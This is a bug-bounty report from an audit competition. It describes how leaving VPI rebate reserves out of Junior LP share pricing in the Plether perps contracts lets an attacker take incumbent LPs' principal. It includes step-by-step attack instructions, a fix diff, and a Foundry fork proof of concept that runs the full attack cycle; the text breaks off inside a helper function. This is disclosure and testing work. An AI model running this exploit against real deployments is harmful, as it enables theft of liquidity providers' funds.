# \#99189 [SC-Critical] Missing VPI rebate reserve in LP NAV in `HousePoolAccountingLib.buildReconcileSnapshot()` lets a trader-LP take Junior LPs' principal

**Submitted on Nov 12th 2026 at 10:39:17 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99189
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-reducing open pays its VPI rebate R out of HousePool cash into a locked reserve that the close always returns, but the LP share price counts the cash and not the reserve, so Junior NAV reads R too low while the position is open. Any address can open such a position, have its own Junior deposit activated at that low price, then close and redeem. This is Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield: on a fork of the v2.0.0 deployment one cycle took 24,819.07 USDG of principal from the existing Junior LPs, and the attacker netted 8,808.89 USDG after all fees.

## Vulnerability Details

A skew-reducing open has a negative trade cost. `CfdEnginePlanLib.planOpen()` turns it into a pool payout (`CfdEnginePlanLib.sol#L333`). `CfdEngineSettlementSidecar.executeOpen()` pays it from HousePool cash (`CfdEngineSettlementSidecar.sol#L443`) and locks the same amount R as a nonwithdrawable reserve on the trader's account (`CfdEngineSettlementSidecar.sol#L470`). On close, the lifetime clamp charges back at least the rebate received (`CloseAccountingLib.sol#L116`) and the reserve is consumed into HousePool (`CfdEngineSettlementSidecar.sol#L692`). R is pool cash that is out for the life of the position and certain to return.

LP pricing does not count it. `CfdEngineProtocolLens.getHousePoolInputSnapshot()` sets `physicalAssets = pool.totalAssets()` (`CfdEngineProtocolLens.sol#L64`) and copies the terminal delta with no reserve term (`CfdEngineProtocolLens.sol#L70`). `HousePoolAccountingLib.buildReconcileSnapshot()` prices LP equity from those two values (`HousePoolAccountingLib.sol#L63`). While the position is open, the reconcile books R as a Junior loss, and `HousePool` prices the Junior deposit phase at that lowered principal (`HousePool.sol#L915`). When R returns, it is revenue for whoever holds Junior at that moment. A depositor activated in between collects its share of R from the earlier holders. Settlement is permissionless (`OrderRouter.sol#L479`), so the attacker chooses the moment.

packages/perps/SECURITY.md ("Exact symmetric LP NAV") says the reserve stays out of NAV so LPs cannot withdraw it before the position settles. Redemption cash is already limited to physical assets by `buildWithdrawalSnapshot()`, so leaving the reserve out of the share price only moves value between LP cohorts.

Pre-condition: third-party skew to reduce (at the fork block, 37.41M LONG against 0.227M SHORT tokens). Existing Junior LPs cannot opt out: the same reconcile reprices their shares.

1. The attacker calls `requestDeposit()` on the Junior `TrancheVault` with its own USDG, before the cutoff of the next LP epoch boundary.
2. Two minutes before the boundary the attacker commits a skew-reducing SHORT with `OrderRouter.commitOrder()` and any keeper executes it. R leaves HousePool cash into the attacker's reserve.
3. After the boundary anyone calls `OrderRouter.settleLpEpoch()`. The reconcile books R as a Junior loss and the attacker's deposit is activated at that price; the attacker claims its shares with `deposit()`.
4. The attacker closes the SHORT. The clamp returns R to HousePool as Junior revenue.
5. After the 1 h cooldown the attacker calls `requestRedeem()` for all its shares; the next settlement funds it and `redeem()` pays out.

## Impact Details

**Selected impact:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

One cycle on the fork, against the same deposit and redemption without the trade (USDG, basket price flat):

- Rebate R paid from HousePool cash: 50,895.54, fully returned on the close.
- Existing Junior principal at the end: 101,060,567.12 with the attack, 101,085,386.19 without. Loss: 24,819.07.
- Attacker: LP leg +25,300.86, trader leg -16,491.97 (both execution fees and spread), net +8,808.89. The same address without the trade nets -10.05.

The loss is principal of the existing Junior LPs. The cycle can be repeated while third-party skew is open.

## Recommendation

```diff
diff --git a/packages/perps/src/CfdEngineProtocolLens.sol b/packages/perps/src/CfdEngineProtocolLens.sol
index 134bc599..57645899 100644
--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
@@ -10,6 +10,10 @@ import {ProtocolLensViewTypes} from "@plether/perps/interfaces/ProtocolLensViewT
 import {OracleFreshnessPolicyLib} from "@plether/perps/libraries/OracleFreshnessPolicyLib.sol";
 import {SolvencyAccountingLib} from "@plether/perps/libraries/SolvencyAccountingLib.sol";
 
+interface IVpiRebateReserveTotal {
+    function totalVpiRebateReserveAssets() external view returns (uint256);
+}
+
 /// @title CfdEngineProtocolLens
 /// @notice Rich protocol-accounting lens for audits, tests, and HousePool integration.
 /// @dev This permissionless, read-only lens exposes conservative solvency and liability views rather than product-level
@@ -62,12 +66,17 @@ contract CfdEngineProtocolLens is ICfdEngineProtocolLens {
         ICfdEngineTypes.TerminalNavSnapshot memory terminalSnapshot = engineContract.terminalNavSnapshot();
         uint256 poolAssets = engineContract.pool().totalAssets();
         snapshot.physicalAssets = poolAssets;
+        // Negative-VPI reserves are pool cash paid out as open rebates that the lifetime clamp returns on close or
+        // liquidation: count them as an LP receivable for share pricing only, never as redemption cash.
+        uint256 vpiRebateReserveAssets =
+            IVpiRebateReserveTotal(address(engineContract.clearinghouse())).totalVpiRebateReserveAssets();
         snapshot.netPhysicalAssets = poolAssets;
         snapshot.maxLiabilityAssets = terminalSnapshot.maxDirectionalLiabilityAssets;
         snapshot.supplementalReservedAssets = SolvencyAccountingLib.settlementBufferTargetAssets(
             snapshot.maxLiabilityAssets, engineContract.settlementBufferBps()
         );
-        snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
+        snapshot.terminalLpPriceDeltaAssets =
+            terminalSnapshot.terminalLpPriceDeltaAssets + int256(vpiRebateReserveAssets);
         snapshot.terminalNavBookVersion = terminalSnapshot.bookVersion;
         snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
         snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
diff --git a/packages/perps/src/MarginClearinghouse.sol b/packages/perps/src/MarginClearinghouse.sol
index 484a6d59..667e34a8 100644
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
@@ -75,6 +75,10 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
     ///      settlement sidecar, as documented on those entrypoints.
     address public engine;
 
+    /// @notice Sum of every account's negative-VPI reserve: pool cash paid out as open rebates that the lifetime clamp
+    ///         returns on close or liquidation. Marked as an LP receivable for share pricing only.
+    uint256 public totalVpiRebateReserveAssets;
+
     /// @notice The caller is not the engine or the engine-derived integration authorized for the operation.
     error MarginClearinghouse__NotOperator();
 
@@ -849,6 +853,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
         }
         _lockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
     }
 
     /// @notice Reclassifies newly locked PnL pledge into mandatory negative-VPI backing without moving cash.
@@ -862,6 +867,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
         _consumeLockedMargin(account, IMarginClearinghouse.MarginBucket.Position, amountAssets);
         reservedSettlementAssets[account] += amountAssets;
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
         emit MarginLocked(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -877,6 +883,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         _unlockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -899,6 +906,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         reservedSettlementAssets[account] -= amountAssets;
         settlementBalances[account] -= amountAssets;
         IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
```

## Proof of Concept

## Proof of Concept

- Env var: `ARB_SEPOLIA_RPC_URL` = an archive RPC URL of Arbitrum Sepolia; read-only, the test runs on a local fork
- Fork block: 326368388 (chain id 421614)
- Forge: 1.8.7
- Command, from `packages/perps`: `ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F032_ReserveBackedVPIRebateOmitted.t.sol --match-test test_F032_poc -vvv`
- File: `packages/perps/test/F032_ReserveBackedVPIRebateOmitted.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Reserve-backed VPI rebate omitted from LP NAV in `HousePoolAccountingLib.buildReconcileSnapshot()` lets a trader-LP buy Junior shares below value and take existing Junior LPs' principal
// Chain: Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F032_ReserveBackedVPIRebateOmitted.t.sol --match-test test_F032_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number 326368388 &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F032_ReserveBackedVPIRebateOmitted.t.sol ...
// The RPC must serve historical state at block 326368388 (an ARCHIVE node). The public https://sepolia-rollup.arbitrum.io/rpc
// does not; https://arbitrum-sepolia.gateway.tenderly.co does.
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";
// Import interfaces and types only (not the in-scope implementations): editing this file then recompiles in seconds,
// and the PoC cannot accidentally deploy local code instead of the deployment.
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public HousePool getters used by the PoC.
interface IHousePoolF032 {
    function totalAssets() external view returns (uint256);
    function seniorPrincipal() external view returns (uint256);
    function juniorPrincipal() external view returns (uint256);
    function juniorVault() external view returns (address);
    function lpEpochStart(uint256 epochId) external view returns (uint256);
    function paused() external view returns (bool);
    function ENGINE_PROTOCOL_LENS() external view returns (address);
}

interface IEngineF032 {
    function degradedMode() external view returns (bool);
    function lastMarkPrice() external view returns (uint256);
    function executionFeeBps() external view returns (uint256);
    function totalTraderClaimBalanceAssets() external view returns (uint256);
    function traderClaimBalanceAssets(address account) external view returns (uint256);
    function sides(uint256 index)
        external
        view
        returns (uint256 maxProfitAssets, uint256 openInterest, uint256 entryNotional, uint256 totalMargin);
    function positions(address account)
        external
        view
        returns (
            uint256 size,
            uint256 margin,
            uint256 entryPrice,
            uint256 maxProfitAssets,
            CfdTypes.Side side,
            uint64 lastUpdateTime,
            int256 vpiAccrued
        );
    function riskParams()
        external
        view
        returns (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        );
}

interface IRouterF032 {
    function pletherOracle() external view returns (address);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
}

interface ITrancheVaultF032 {
    function requestDeposit(uint256 assets, address receiver) external returns (uint256 requestId);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId);
    function redeem(uint256 shares, address receiver, address controller) external returns (uint256 assets);
    function maxRedeem(address controller) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function depositQueueHead() external view returns (uint256);
    function redeemQueueHead() external view returns (uint256);
}

interface IOracleF032 {
    function pyth() external view returns (address);
    function isOracleFrozen() external view returns (bool);
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
    function housePool() external view returns (address);
}

interface IPythFeeF032 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IArbSysBlockF032 {
    function arbBlockNumber() external view returns (uint256);
}

contract F032_ReserveBackedVPIRebateOmitted is Test {
    // Pinned Arbitrum Sepolia block (2026-11-05 17:42 UTC, a Thursday: FX market open). At or after the deployment block
    // 323658447. Live state: 102.2M USDG pool (101.0M Junior, 1.1M Senior) and open trader skew built by testnet
    // traders (37.41M LONG vs 0.227M SHORT tokens), so the attacker needs no account of its own on the other side.
    uint256 internal constant FORK_BLOCK = 326368388;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    uint256 internal constant BASE = 10_000; // basket held flat at the real stored Pyth prices: no price move at all

    // Attacker sizing (USDG, 6 decimals). The Junior deposit stays below the 100M USDG case-by-case threshold
    // (scope page, Attack Investment Amount). The SHORT reduces the existing LONG skew (about 36.0M USDG) by 20M.
    uint256 internal constant LP_DEPOSIT = 99_000_000e6;
    uint256 internal constant SHORT_NOTIONAL = 20_000_000e6;
    uint256 internal constant SHORT_MARGIN = 200_000e6; // 1% margin (initial margin is 0.2%)
    uint256 internal constant TRADER_FUNDING = 300_000e6; // margin + both execution fees + spread

    IHousePoolF032 internal pool = IHousePoolF032(POOL);
    IEngineF032 internal engine = IEngineF032(ENGINE);
    IRouterF032 internal router = IRouterF032(ROUTER);
    IPerpsKeeper internal keeperRouter = IPerpsKeeper(ROUTER);
    IMarginClearinghouse internal clearinghouse = IMarginClearinghouse(CLEARINGHOUSE);
    IOrderLifecycleBook internal lifecycle = IOrderLifecycleBook(LIFECYCLE_BOOK);
    ITrancheVaultF032 internal junior = ITrancheVaultF032(JUNIOR_VAULT);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal attacker = makeAddr("attacker"); // one address: trader account + Junior LP, own USDG only
    address internal keeper = makeAddr("keeper"); // any order executor / LP-epoch settler (permissionless)
    address internal refresher = makeAddr("refresher"); // any mark refresher

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Height = FORK_BLOCK;
    uint64 internal cur; // scenario clock (== block.timestamp)
    uint256 internal orderNonce;

    struct Run {
        uint256 entryEpoch;
        uint256 poolBeforeOpen;
        uint256 poolAfterOpen;
        uint256 reserve; // R: the attacker's VPI reserve after the open (pool cash paid out for the rebate)
        uint256 juniorAfterActivation; // Junior principal right after the attacker's deposit activated
        uint256 attackerShares;
        uint256 supplyAfterActivation;
        uint256 poolAfterClose;
        uint256 reserveAfterClose;
        uint256 longOiAfterClose;
        uint256 shortOiAfterClose;
        uint256 attackerUsdgOut; // USDG the attacker redeemed from the Junior vault
        uint256 attackerTraderValue; // attacker's clearinghouse balance + trader claim once flat
        uint256 attackerSharesLeft;
        uint256 juniorEnd; // Junior principal after the attacker fully exited = the incumbent Junior LPs' principal
        uint256 juniorSupplyEnd;
    }

    // virtual: the never-submitted fix-check test (`finding.py poc F-032 --fix-test`) extends this setUp.
    function setUp() public virtual {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(router.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(IOracleF032(ORACLE).housePool(), POOL, "oracle pool drifted");
        assertEq(IOracleF032(ORACLE).pyth(), PYTH, "oracle Pyth drifted");
        assertEq(pool.juniorVault(), JUNIOR_VAULT, "junior vault drifted");
        assertFalse(IOracleF032(ORACLE).isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertFalse(engine.degradedMode(), "engine not degraded at the fork");
        assertFalse(pool.paused(), "pool not paused at the fork");
        assertEq(pool.totalAssets(), 102_206_284_577_792, "pool = 102,206,284.58 USDG");
        assertEq(pool.juniorPrincipal(), 101_027_075_118_601, "incumbent Junior principal = 101,027,075.12 USDG");
        assertEq(pool.seniorPrincipal(), 1_111_493_673_951, "Senior principal = 1,111,493.67 USDG");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims at the fork");
        assertEq(engine.lastMarkPrice(), 96_907_516, "mark 0.96907516");
        (, uint256 longOi,,) = engine.sides(0);
        (, uint256 shortOi,,) = engine.sides(1);
        assertEq(longOi, 37_408_800e18, "third-party LONG open interest");
        assertEq(shortOi, 227_000e18, "third-party SHORT open interest");
        assertEq(junior.depositQueueHead() + junior.redeemQueueHead(), 0, "junior LP queues empty");
        _assertReleaseParameters();
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleF032(ORACLE).pythFeedIds(i));
            inverted.push(IOracleF032(ORACLE).inversions(i));
        }
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope (scope page: "Mocks may only replace components outside the scope, such as Pyth price
        // updates and USDG"): replace its code with the repo's MockPyth. Storage starts from the REAL stored prices at
        // FORK_BLOCK and every update below republishes those same prices: the basket never moves.
        pythFee = IPythFeeF032(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
        }
        cur = uint64(block.timestamp);
        vm.deal(keeper, 1 ether);
        vm.deal(refresher, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    /// @dev DEPLOYMENT.md "Initial release parameters" (scope page: severity is assessed with these) against the
    ///      forked engine. They match, so no owner step is needed.
    function _assertReleaseParameters() internal view {
        (uint256 vpiFactor, uint256 maxSkewRatio,, uint256 initMarginBps,,,,,,) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor 1%");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio 40%");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
    }

    // ================================================================= F-032 proof of concept
    //
    // One unprivileged address runs a closed cycle against the incumbent Junior LPs. The basket price never moves.
    //   Step 1: request a 99M USDG Junior deposit (before the epoch cutoff).
    //   Step 2: just before the epoch boundary, open a 20M USDG SHORT against the testnet traders' LONG skew. The open
    //           earns a VPI rebate R that HousePool pays out of its cash into the attacker's nonwithdrawable reserve.
    //   Step 3: after the boundary, settle the LP epoch through the permissionless Router: the reconcile prices Junior
    //           at cash + K - claims, which leaves R out, so the deposit activates at a Junior NAV lowered by R.
    //   Step 4: close the SHORT. The lifetime clamp charges back exactly R from the reserve into HousePool cash.
    //   Step 5: after the 1 h cooldown, request the redemption; the next settlement funds it; redeem the USDG.
    // The same timeline without Steps 2 and 4 (identical deposit, settlements and redemption) is the reference. Every
    // position, the skew and HousePool cash end where they started; only Junior ownership moved.
    function test_F032_poc() public {
        uint256 juniorAtFork = pool.juniorPrincipal();
        uint256 snap = vm.snapshotState();
        uint64 cur0 = cur;
        uint256 l20 = l2Height;

        Run memory a = _cycle(true);

        vm.revertToState(snap);
        cur = cur0;
        l2Height = l20;
        _syncClock();
        Run memory r = _cycle(false);

        _log("[attack] cycle with the rebate open across the activation", a);
        _log("[reference] same deposit and redemption, no trade", r);

        // ---- the cycle is closed: the rebate left HousePool cash, came back in full, and the book is unchanged
        assertGt(a.reserve, 0, "the open paid a reserve-backed rebate");
        assertEq(a.poolBeforeOpen - a.poolAfterOpen, a.reserve, "rebate R left HousePool cash into the reserve");
        assertEq(a.reserveAfterClose, 0, "the close consumed the whole reserve back into HousePool");
        assertEq(a.longOiAfterClose, r.longOiAfterClose, "LONG book unchanged");
        assertEq(a.shortOiAfterClose, r.shortOiAfterClose, "SHORT book unchanged");
        assertEq(a.attackerSharesLeft + r.attackerSharesLeft, 0, "attacker fully exited in both runs");
        assertEq(a.juniorSupplyEnd, r.juniorSupplyEnd, "incumbent Junior share supply identical in both runs");
        int256 poolCashDelta = int256(a.poolAfterClose) - int256(r.poolAfterClose);
        console.log("HousePool cash after the close, attack minus reference (USDG 1e6)", poolCashDelta);

        // ---- damage: incumbent Junior LPs end with less principal; the attacker's share of R is that principal
        int256 incumbentLoss = int256(r.juniorEnd) - int256(a.juniorEnd);
        uint256 fJ_R = a.reserve * a.attackerShares / a.supplyAfterActivation; // f_J * R, f_J = attacker share of Junior
        console.log("incumbent Junior principal at the fork (USDG 1e6)", juniorAtFork);
        console.log("incumbent Junior principal at the end, reference (USDG 1e6)", r.juniorEnd);
        console.log("incumbent Junior principal at the end, attack (USDG 1e6)", a.juniorEnd);
        console.log("incumbent Junior LP loss vs reference (USDG 1e6)", incumbentLoss);
        console.log("rebate R paid out of HousePool cash (USDG 1e6)", a.reserve);
        console.log("attacker share of Junior after activation f_J (1e6)", a.attackerShares * 1e6 / a.supplyAfterActivation);
        console.log("f_J * R (USDG 1e6)", fJ_R);
        assertGt(incumbentLoss, int256(fJ_R * 9 / 10), "incumbent Junior LPs lost principal to the entrant"); // DAMAGE
        assertLt(incumbentLoss, int256(a.reserve), "loss bounded by R");

        int256 lpLeg = int256(a.attackerUsdgOut) - int256(LP_DEPOSIT);
        int256 traderLeg = int256(a.attackerTraderValue) - int256(TRADER_FUNDING);
        int256 attackerNet = lpLeg + traderLeg;
        int256 referenceNet =
            int256(r.attackerUsdgOut) - int256(LP_DEPOSIT) + int256(r.attackerTraderValue) - int256(TRADER_FUNDING);
        console.log("attacker LP leg: USDG redeemed minus deposited (USDG 1e6)", lpLeg);
        console.log("attacker trader leg: fees + spread paid, VPI net zero (USDG 1e6)", traderLeg);
        console.log("attacker net after both execution fees (USDG 1e6)", attackerNet);
        console.log("same address, reference run net (USDG 1e6)", referenceNet);
        assertGt(attackerNet, 0, "attacker net profit after both execution fees");

        // ---- how the entry was priced: the activation used a Junior NAV without R
        console.log("Junior principal after activation, attack (USDG 1e6)", a.juniorAfterActivation);
        console.log("Junior principal after activation, reference (USDG 1e6)", r.juniorAfterActivation);
        console.log("attacker Junior shares, attack", a.attackerShares);
        console.log("attacker Junior shares, reference", r.attackerShares);
    }

    /// Control: the honest LP round trip on the same fork (deposit, settle, redeem; no trade). Must PASS with and
    /// without the fix: an entrant who does not open a rebate position gets back what it paid in.
    function test_F032_control() public {
        Run memory r = _cycle(false);
        _log("[control] honest Junior deposit and redemption", r);
        assertEq(r.attackerSharesLeft, 0, "honest LP fully exited");
        int256 net = int256(r.attackerUsdgOut) - int256(LP_DEPOSIT);
        console.log("honest LP net (USDG 1e6)", net);
        assertLe(net < 0 ? -net : net, 100e6, "honest LP round trip is value-neutral (within 100 USDG)");
        assertEq(r.attackerTraderValue, TRADER_FUNDING, "no trade, trader account untouched");
    }

    // ------------------------------------------------------------------ scenario

    function _cycle(bool attack) internal returns (Run memory r) {
        _fundTrader(attacker, TRADER_FUNDING);

        // Step 1: Junior deposit request (own USDG), before the cutoff of the next epoch boundary.
        deal(USDG, attacker, LP_DEPOSIT);
        vm.startPrank(attacker);
        IERC20(USDG).approve(JUNIOR_VAULT, LP_DEPOSIT);
        r.entryEpoch = junior.requestDeposit(LP_DEPOSIT, attacker);
        vm.stopPrank();
        uint64 boundary = uint64(pool.lpEpochStart(r.entryEpoch));

        // Step 2: two minutes before the boundary, open the skew-reducing SHORT (ordinary order, any keeper fills it).
        _advance(boundary - 125);
        _refreshMark();
        r.poolBeforeOpen = pool.totalAssets();
        if (attack) {
            uint256 size = _quantize(SHORT_NOTIONAL * 1e20 / engine.lastMarkPrice());
            OrderV3Types.ExecutionResult memory res =
                _trade(CfdTypes.Side.SHORT, size, SHORT_MARGIN, false);
            assertEq(uint256(res.status), uint256(OrderV3Types.LifecycleStatus.Executed), "SHORT opened");
        } else {
            _advance(cur + 3);
        }
        r.poolAfterOpen = pool.totalAssets();
        r.reserve = clearinghouse.vpiRebateReserveAssets(attacker);

        // Step 3: after the boundary anyone settles the LP epoch through the Router (here a keeper); the reconcile
        //         runs first and the Junior deposit phase is priced at the reconciled juniorPrincipal.
        _advance(boundary + 30);
        vm.prank(keeper);
        router.settleLpEpoch{value: pythFee}(_payload(cur, cur - 1));
        r.juniorAfterActivation = pool.juniorPrincipal();
        vm.prank(attacker);
        r.attackerShares = junior.deposit(LP_DEPOSIT, attacker);
        r.supplyAfterActivation = junior.totalSupply();

        // Step 4: close the SHORT; the lifetime clamp charges back R from the reserve into HousePool cash.
        _advance(cur + 30);
        if (attack) {
            (uint256 size,,,,,,) = engine.positions(attacker);
            OrderV3Types.ExecutionResult memory res = _trade(CfdTypes.Side.SHORT, size, 0, true);
            assertEq(uint256(res.status), uint256(OrderV3Types.LifecycleStatus.Executed), "SHORT closed");
        } else {
            _advance(cur + 3);
        }
        r.poolAfterClose = pool.totalAssets();
        r.reserveAfterClose = clearinghouse.vpiRebateReserveAssets(attacker);
        (, r.longOiAfterClose,,) = engine.sides(0);
        (, r.shortOiAfterClose,,) = engine.sides(1);

        // Step 5: after the 1 h activation cooldown request the full redemption; the next settlement funds it.
        _advance(uint64(pool.lpEpochStart(r.entryEpoch + 1)) + 40);
        uint256 shares = junior.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemEpoch = junior.requestRedeem(shares, attacker, attacker);
        _advance(uint64(pool.lpEpochStart(redeemEpoch)) + 30);
        vm.prank(keeper);
        router.settleLpEpoch{value: pythFee}(_payload(cur, cur - 1));
        uint256 usdgBefore = IERC20(USDG).balanceOf(attacker);
        uint256 claimable = junior.maxRedeem(attacker);
        vm.prank(attacker);
        junior.redeem(claimable, attacker, attacker);
        r.attackerUsdgOut = IERC20(USDG).balanceOf(attacker) - usdgBefore;
        r.attackerTraderValue = clearinghouse.balanceAssets(attacker) + engine.traderClaimBalanceAssets(attacker);
        r.attackerSharesLeft = junior.balanceOf(attacker) + junior.maxRedeem(attacker);
        r.juniorEnd = pool.juniorPrincipal();
        r.juniorSupplyEnd = junior.totalSupply();
    }

    function _log(string memory label, Run memory r) internal pure {
        console.log(label);
        console.log("  HousePool cash before the open (USDG 1e6)", r.poolBeforeOpen);
        console.log("  HousePool cash after the open (USDG 1e6)", r.poolAfterOpen);
        console.log("  attacker VPI reserve R after the open (USDG 1e6)", r.reserve);
        console.log("  HousePool cash after the close (USDG 1e6)", r.poolAfterClose);
        console.log("  attacker VPI reserve after the close (USDG 1e6)", r.reserveAfterClose);
        console.log("  attacker USDG redeemed from Junior (USDG 1e6)", r.attackerUsdgOut);
        console.log("  attacker trader account once flat (USDG 1e6)", r.attackerTraderValue);
        console.log("  incumbent Junior principal at the end (USDG 1e6)", r.juniorEnd);
    }

    // ------------------------------------------------------------------ helpers (same harness as the repo's fork tests)

    function _refreshMark() internal {
        _advance(cur + 2);
        vm.prank(refresher);
        router.updateMarkPrice{value: pythFee}(_payload(cur, cur - 1));
    }

    function _fundTrader(address acct, uint256 amount) internal {
        deal(USDG, acct, amount);
        vm.startPrank(acct);
        IERC20(USDG).approve(CLEARINGHOUSE, amount);
        clearinghouse.depositFor(acct, amount);
        vm.stopPrank();
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory) {
        uint256 window = router.maxExecutionWindowSeconds();
        return OrderV3Types.ExecutionBounds({
            submitBy: uint64(cur + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycle.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
